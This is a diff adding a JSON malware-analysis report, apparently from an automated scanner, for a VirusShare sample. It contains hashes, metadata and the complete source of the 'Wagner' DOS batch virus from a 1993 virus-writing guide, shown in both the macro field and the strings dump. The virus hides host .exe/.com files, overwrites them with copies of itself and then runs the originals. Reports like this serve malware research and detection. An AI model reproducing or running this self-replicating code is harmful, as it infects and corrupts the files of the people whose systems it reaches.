@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "COMMAND": "May run PowerShell commands"
+        },
+        "macro": ":: Wagner\n@echo off\nctty nul\nrem  ______________________________________________________________\nrem :Wagner Virus, as presented in Virology 101 (c) 1993 Black Wolf\nrem :This virus can be cured simply by typing \"attrib -h -r *.*\" in\nrem :infected directories and deleting BAT files that are identical\nrem :to this code, then rename the files having a \"V\" at the start\nrem :to their original names.   NOTE: Does not infect COMMAND.COM.\nrem :______________________________________________________________\nfor %%f in (*.exe *.com) do set A=%%f\nif %A%==COMMAND.COM set A=\nrename %A% V%A%\nif not exist V%A% goto end\nattrib +h V%A%\ncopy %0.bat %A%\nattrib +r %A%\nren %A% *.bat\nset A=\n:end\nctty con\n@if exist V%0.com V%0.com %1 %2 %3\n@if exist V%0.exe V%0.exe %1 %2 %3"
+    },
+    "filename": "VirusShare_4305437c1ce5cd5c83ab1abf0576616b",
+    "filesize": 782,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4305437c1ce5cd5c83ab1abf0576616b",
+        "sha1": "06614133ca98c94fdef0f026ce15e45b1917b705",
+        "sha256": "89677cec57e265b0d58fb726240cc29880d5efc676291124a654d16fb9868451"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ":: Wagner",
+            "@echo off",
+            "ctty nul",
+            "rem  ______________________________________________________________",
+            "rem :Wagner Virus, as presented in Virology 101 (c) 1993 Black Wolf",
+            "rem :This virus can be cured simply by typing \"attrib -h -r *.*\" in",
+            "rem :infected directories and deleting BAT files that are identical",
+            "rem :to this code, then rename the files having a \"V\" at the start",
+            "rem :to their original names.   NOTE: Does not infect COMMAND.COM.",
+            "rem :______________________________________________________________",
+            "for %%f in (*.exe *.com) do set A=%%f",
+            "if %A%==COMMAND.COM set A=",
+            "rename %A% V%A%",
+            "if not exist V%A% goto end",
+            "attrib +h V%A%",
+            "copy %0.bat %A%",
+            "attrib +r %A%",
+            "ren %A% *.bat",
+            "set A=",
+            ":end",
+            "ctty con",
+            "@if exist V%0.com V%0.com %1 %2 %3",
+            "@if exist V%0.exe V%0.exe %1 %2 %3"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.281328",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
